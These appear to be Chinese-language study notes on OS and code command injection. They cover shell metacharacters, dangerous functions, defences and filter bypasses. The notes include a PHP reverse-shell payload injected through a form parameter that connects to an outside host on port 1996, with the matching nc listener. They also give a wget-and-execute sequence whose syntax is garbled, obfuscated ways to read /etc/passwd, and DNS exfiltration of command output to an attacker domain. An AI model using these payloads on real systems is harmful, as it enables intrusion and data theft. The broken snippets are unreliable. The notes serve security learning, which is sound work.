# 命令执行漏洞

系统命令执行

&、&&、|、||

```
&	#后台执行
&& 	#前一条命令执行成功，才执行后面一条命令
|	#上一条命令输出作为下一条命令的参数
||	#上一条命令执行失败后才执行下一条命令
; 	# 多个命令顺序执行
	换行符(\n或0x0a)
```

在基于 Unix 的系统上，您还可以使用反引号或美元字符在原始命令中执行注入命令的内联执行：

```
` 注入命令 `
$( 注入命令 )
```

请注意，不同的 shell 元字符具有细微的不同行为，这些行为可能会影响它们是否在某些情况下工作，以及它们是否允许带内检索命令输出或仅对盲目利用有用。
有时，您控制的输入会出现在原始命令的引号内。在这种情况下，您需要在使用合适的 shell 元字符注入新命令之前终止引用的上下文（使用"或'）。



代码命令执行

PHP:  system、exec、shell、exec、popen、proc_popen 等

Python: eval()、 os.system()、 subprocess.Popen等

| 命令的目的 | Linux         | Windows         |
| :--------- | :------------ | :-------------- |
| 当前用户名 | `whoami`      | `whoami`        |
| 操作系统   | `uname -a`    | `ver`           |
| 网络配置   | `ifconfig`    | `ipconfig /all` |
| 网络连接   | `netstat -an` | `netstat -an`   |
| 运行进程   | `ps -ef`      | `tasklist`      |

# 命令执行利用场景

1.存在回显的情况

2.可以执行延时函数的情况

# 系统命令执行与代码命令执行漏洞的检测与利用

系统命令

![image-20210616094722183](D:\BaiduNetdiskDownload\安全\命令执行漏洞\命令执行漏洞原理与应用场景.assets\image-20210616094722183.png)

代码命令执行

```
ip=127.0.0.1+%26%26+php -r '$sock=fsockopen("daishen.ltd",1996);exec("/bin/bash -i <&3 >&3 2>&3")'&Submit=Submit
```

```
nc -lvvp 1996
```

```
System('wget xxxxx/1.sh';
System('Is');
System('chmod +X 1.sh');
system(/bin/bash 1.sh');

```

# 系统命令执行与代码命令执行防御与绕过

不使用命令执行函数

如果一定使用命令执行函数，则进行输入验证：

- 根据允许值的白名单进行验证。
- 验证输入是否为数字。
- 验证输入仅包含字母数字字符，没有其他语法或空格。

输入的命令尽量使用占位符，不要直接拼接变量

尽量不要执行危险函数，将disable_functions禁用

使用escapeshellcmd函数进行过滤

使用safe_mode_exec_dir，指定可执行文件路径

永远不要试图通过转义 shell 元字符来清理输入。在实践中，这太容易出错并且容易被熟练的攻击者绕过。

绕过

```
%0a\%0d    换行，回车

cat /etc/passwd >>>> c""at /etc/pas""swd >>>> ca\t /etc/pas\swd >>>> ca\t /etc/pas???

whoami >>>> w"h"o"a"mi >>>> (w"h"o"a"mi) >>>> wh""""""""""oami

ping 127.0.0.1 >>>> ping 2130706433
```

### 通过重定向输出利用盲操作系统命令注入

您可以将注入命令的输出重定向到 Web 根目录中的文件中，然后您可以使用浏览器检索该文件。例如，如果应用程序从文件系统位置提供静态资源`/var/www/static`，那么您可以提交以下输入：

```
& whoami > /var/www/static/whoami.txt &
```

`>`字符发送从所述输出`whoami`命令指定的文件。然后，您可以使用浏览器来获取`https://vulnerable-website.com/whoami.txt`文件，并查看注入命令的输出。

### 使用带外 ( [OAST](https://portswigger.net/burp/application-security-testing/oast) ) 技术利用 OS 命令盲注入

您可以使用注入的命令，使用 OAST 技术触发与您控制的系统的带外网络交互。例如：

```
& nslookup kgji2ohoyw.web-attacker.com &
```

此有效负载使用该`nslookup`命令对指定域进行 DNS 查找。攻击者可以监视指定的查找发生，从而检测到命令已成功注入。

带外通道还提供了一种从注入的命令中提取输出的简单方法：

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

这将导致对包含`whoami`命令结果的攻击者域进行 DNS 查找：

```
wwwuser.kgji2ohoyw.web-attacker.com
```
